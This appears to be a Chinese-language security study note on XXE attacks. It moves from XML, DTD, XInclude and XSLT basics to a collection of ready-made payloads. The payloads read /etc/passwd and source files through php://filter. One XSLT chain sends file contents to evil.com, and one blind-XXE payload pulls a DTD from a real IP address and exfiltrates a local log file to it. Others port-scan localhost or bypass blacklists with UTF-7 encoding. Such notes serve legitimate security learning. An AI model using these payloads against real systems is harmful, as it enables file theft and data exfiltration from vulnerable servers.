# xxe

## 链接

https://thief.one/2017/06/20/1/

https://v0w.top/2019/01/20/XXE-note/

https://www.freebuf.com/articles/web/177979.html

https://www.w3school.com.cn/xml/xml_intro.asp

 https://www.anquanke.com/post/id/156227#h2-1 

 https://www.anquanke.com/post/id/155328 

## xml语法基础

xml 是语法类似html

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

`<note>`:根元素

所有元素均可拥有文本内容和属性（类似 HTML 中）。

#### xml特性

- 所有xml元素必须有关闭标签
- xml标签对大小写敏感
- xml文档必须有根元素
- xml属性值必须加引号
- 在 XML 中，文档中的空格不会被删节

#### xml dtd

这里我们要关注的是外部实体,和引用实体

##### dtd定义

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。

DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

##### 内部的 DOCTYPE 声明

假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：

```
<!DOCTYPE 根元素 [元素声明]>
```

带有 DTD 的 XML 文档实例：

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE note [			这是DTD内部声明		  <!ELEMENT note (to,from,heading,body)>  
 <!ELEMENT to      (#PCDATA)>  
 <!ELEMENT from    (#PCDATA)>  
 <!ELEMENT heading (#PCDATA)> 
 <!ELEMENT body    (#PCDATA)>
 ]>							
<note>  
<to>George</to>  
<from>John</from>  
<heading>Reminder</heading>  
<body>Don't forget the meeting!</body>
</note>
```

**以上 DTD 解释如下：**

- **!DOCTYPE note** (第二行)定义此文档是 *note* 类型的文档。

- **!ELEMENT note** (第三行)定义 *note* 元素有四个元素：”to、from、heading,、body”

- **!ELEMENT to** (第四行)定义 *to* 元素为 “#PCDATA” 类型

  (之后类似)

**这里有一个小重点Tips：**

- “#PCDATA” 类型为被解析的字符数据（parsed character data）。表示读文件按照XML格式进行解析
- “#CDATA”类型为字符数据（character data）。表示读文件但是不用解析，直接读文件的原始内容

##### dtd元素

`<!ELEMENT 元素名称 类别>`

`<!ELEMENT 元素名称 (元素内容)>`

##### 一个内部实体声明

语法：

```repl
<!ENTITY 实体名称 "实体的值">
```

例子：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo 
[
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >
]
>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

我们使用 &xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &xxe 就会被 “test” 替换。

##### 一个外部实体声明

语法：

```
<!ENTITY 实体名称 SYSTEM "URI/URL">
```

例子：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo 
[
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >
]>
<creds>    
<user>&xxe;</user>    
<pass>mypass</pass>
</creds>
```

##### 参数实体：

```xml
<!ENTITY % 实体名称 "实体的值">或者<!ENTITY % 实体名称 SYSTEM "URI">
```

参数实体只能在DTD中调用,调用方法:`%实体名称`



### xinclude

 https://www.anquanke.com/post/id/156227 

#### 语法



xinclude的语法相对来说，非常简单，只是在`http://www.w3.org/2003/XInclude`命名空间中的两个元素，即 include 和 fallback
常用的命名空间前缀是“xi”(但可以根据喜好自由使用任何前缀)

**xi:include 元素**

元素中的几个属性:

- href — 对要包括的文档的 URI 引用。
- parse — 它的值可以是“xml”或“text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是“xml”。
- xpointer — 这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。

encoding — 作为文本包括时，该属性提供所包括文档的编码提示信息。
样例如下：

```xml
<xi:include href="test.xml" parse="text"/>
```

**xi:fallback 元素**

简单而言，类似于`try...except...`，如果xinclude的内容出现问题，则显示fallback的内容
例如

```xml
<xi:include href="test.xml" parse="text"/>
    <xi:fallback>Sorry, the file is unavailable<xi:fallback>
</xi:include>
```

此时解析xml后，若test.xml不存在，则会解析获取到`Sorry, the file is unavailable`



### xsl

XSL 指扩展样式表语言（EXtensible Stylesheet Language）
而XSLT 指 XSL 转换：即使用 XSLT 可将 XML 文档转换为其他文档，比如XHTML。

#### 简单样例

下面展示利用php后端语言，将xml转换为html
test.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<root>
    <name>sky</name>
    <blog>skysec.top</blog>
    <country>China</country>
</root>
```

test.xsl

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<table border="1">
  <tr bgcolor="#9acd32">
    <th align="left">Name</th> 
    <th align="left">Blog</th> 
    <th align="left">Country</th> 
  </tr>
  <xsl:for-each select="root">
  <tr>
    <td><xsl:value-of select="name" /></td>
    <td><xsl:value-of select="blog" /></td>
    <td><xsl:value-of select="country" /></td>
  </tr>
  </xsl:for-each>
</table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```

test.php

```php
<?php 
$xslDoc = new DOMDocument();
$xslDoc->load("test.xsl");
$xmlDoc = new DOMDocument();
$xmlDoc->load("test.xml");
$proc = new XSLTProcessor();
$proc->importStylesheet($xslDoc);
echo $proc->transformToXML($xmlDoc);
```

结果如下
[![img](https://p5.ssl.qhimg.com/t01f1f7c7c5c85ec8ad.png)](https://p5.ssl.qhimg.com/t01f1f7c7c5c85ec8ad.png)



#### 文件读取

##### 未禁用外部实体引用

 php底层的libxml库默认禁用了外部实体引入，所以我们还是需要手动加入 

```php
$xslDoc = new DOMDocument();
$xslDoc->load("test.xsl",LIBXML_NOENT);
```



```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [  
<!ENTITY shit SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">   
]>  
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/root">
  &shit;
</xsl:template>
</xsl:stylesheet>
```



##### 禁用外部实体引用

```xml
<xsl:variable name="name1" select="document('file:///etc/passwd')" />
<xsl:variable name="name2" select="concat('http://evil.com/?', $name1)" />
<xsl:variable name="name3" select="document($name2)" />
```

#### 端口扫描

##### xsl端口扫描

```xml
<xsl:for-each select="sky">
  <tr>
    <td><xsl:value-of select="name" /></td>
    <td><xsl:value-of select="blog" /></td>
    <td><xsl:value-of select="country" /></td>
    <td><xsl:value-of select="document('http://127.0.0.1:9999')" /></td>
  </tr>
  </xsl:for-each>
```



## 常用payload

### blind-xxe

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file://c:/mls_lca.log">
<!ENTITY % remote SYSTEM "http://39.108.164.219:60001/evil.xml">
%remote;
%all;
]>
<root>&send;</root>
```

vps:

```xml-dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://39.108.164.219:60000/1.php?file=%file;'>">

```



通过 `<![CDATA[`和 `]]>`将payload包裹起来，使其不解析为XML就可以读取文件

### 利用php伪协议任意读取文件

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE root [
	<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root>
	&file;
</root>
```

### 利用UTF-7，UTF-16等编码去Bypass 黑名单



我们利用

```
https://www.motobit.com/util/charset-codepage-conversion.asp
```

转为utf-7

```xml
+ADwAIQ-DOCTYPE ANY +AFs-
  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-
+AF0APg-
+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-
```

然后使用

```
<?xml version="1.0" encoding="utf-7" ?>
```

### xinclude payload(禁用外部实体引用)

```xml
<?xml version="1.0" ?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

